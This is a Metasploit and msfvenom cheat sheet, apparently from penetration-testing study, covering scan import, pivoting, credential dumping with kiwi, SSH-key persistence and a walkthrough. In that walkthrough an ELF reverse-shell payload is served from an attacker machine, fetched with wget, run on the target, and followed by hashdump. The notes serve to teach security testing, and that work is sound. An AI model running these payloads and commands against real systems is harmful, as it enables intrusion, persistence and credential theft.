# General

You can `nmap` from metasploit :)
Import nmap scan into MSF
- Export as XML `-oX file.xml`
- `service postgresql start`
- Msfconsole >  `db_status`
- Msfconsole > `db_import [nmap results]`
- OR > `db_nmap [options] [host]` will automatically nmap and store in database
- Msfconsole > `hosts` and msfconsole > `services` will now show the host and running services from the scan

`background` to bg a session
`sessions` to view
`session #` to change

`search local_exploit_suggestion` for post privesc, use a background session

Search suggestions (in addition to strings)
- `search type:exploit`
- `platform:windows`
- `cve:2021`
- `target:2008 smb`
- search payload example: `grep meterpreter grep reverse_tcp show payloads`

Set global options (don't need to enter it again when switching modules)
- `setg RHOSTS [IP]`
- `setg RPORT`

Plugins
- Stored in `/usr/share/metasploit-framework/plugins`
- move a copy of the plugin there (with file extension), and then open msfconsole again and `load [plugin]` (without file extension)

Using `multi/handler`
- when generating an MSFVenom payload that is a reverse shell, using the multi handler as your listener lets you do a meterpreter shell which is more powerful
- set the LHOST and LPORT as the options you used when generating the venom payload
- set the payload to the same module as venom payload (i.e. `windows/meterpreter/reverse_tcp`)

Upgrade regular shell to Meterpreter
- `multi/manage/shell_to_meterpreter`


Pivoting with MSF
- Get foothold on initial machine (assuming meterpreter is possible)
	- determine internal network netmask `ifconfig` or `ipconfig`
	- background session
- Setting a route:
	- use `post/multi/manage/autoroute`
	- set netmask to the internal network you're targeting (ex. `255.255.255.0`)
	- set session to meterpreter session
	- set subnet ex. `/24`
	- run module
	- use `route` to view the route (you will see two routes, one is the external network and one is the internal)
	- to test a target internal IP use `route get [internal IP]` and it should show you that it routes through the meterpreter session number
	- now you can use any module, set the `rhost` to a target internal IP and it will automatically use your route (ex. `scanner/portscan/tcp`)
- Proxychains
	- set up route for meterpreter shell
	- `cat /etc/proxychains4.conf` at the bottom under `#defaults set to "tor"` you should note the port (usually 9050)
	- background the meterpreter shell and `use auxiliary/server/socks_proxy`
	- set `SRVPORT` to port from config file and set `VERSION` to `4a`
	- run the module, it will appear under `jobs`
	- now execute commands but start them with `proxychain` (outside of msf)
- portfwd
	- in the meterpreter (after setting the route) `portfwd add -l 1234 -p 80 -r [target internal network host IP]`
		- this forwards 1234 from our attacker machine to the port 80
		- `nmap -p1234 localhost` will now nmap the port 80 on the target since you set 1234 to forward to 80 on target


Privesc modules
- search `post/linux/gather/[module]`
- or `post/windows/gather/[module]`
- Kiwi plugin for meterpreter
	-  Once you’re in meterpreter (and optimally migrated to a process with correct architecture)
	- `load kiwi` and `?` to show commands
	- `Creds_all` will dump hashes
	- `Lsa_dump_sam` will dump all NTLM


Persistence
- once you have elevated shell/meterpreter: `post/linux/manage/sshkey_persistence`
	- set CREATESSHFOLDER to true
	- might make one in `/root/.msf4/loot/[ssh_key]`


# MSFVENOM

- Staged syntax - `meterpreter/reverse_tcp`
- Stageless syntax - `meterpreter_reverse_tcp`

`msfvenom --list payloads | grep [parameter]`

Ex. `Msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=[IP] LPORT=[port]`
	shell is shell type such as `meterpreter` 
	file format is exe
	name is shell.exe


Detailed Walkthrough for a meterpreter payload in elf format -
1. Syntax for creating meterpreter payload in elf format (attacking machine) - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
2. Start a python server (attacking machine) - `python3 -m http.server 9000` 
3. Ssh into target machine and download file from the server you just created - `wget http://[attacking_IP]:9000/rev_shell.elf`
4. Change file permissions - `chmod +x rev_shell.elf`
5. On attacking machine, open `msfconsole` and ran `use exploit/multi/handler` to quickly access the exploit we will use to listen.
6. Set payload for the exploit. Use the same file destination from the payload we referenced earlier when we used msfvenom - `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
7. Make sure you set LHOST and LPORT. Use the port you designed it to listen to when you created payload with msfvenom.
8. Run file on target machine with `./[file_name]`
9. Meterpreter session opens on attacking machine on msfconsole.
10. Use a post exploitation module in msfconsole, I used `post/linux/gather/hashdump` to get the other user's hash.
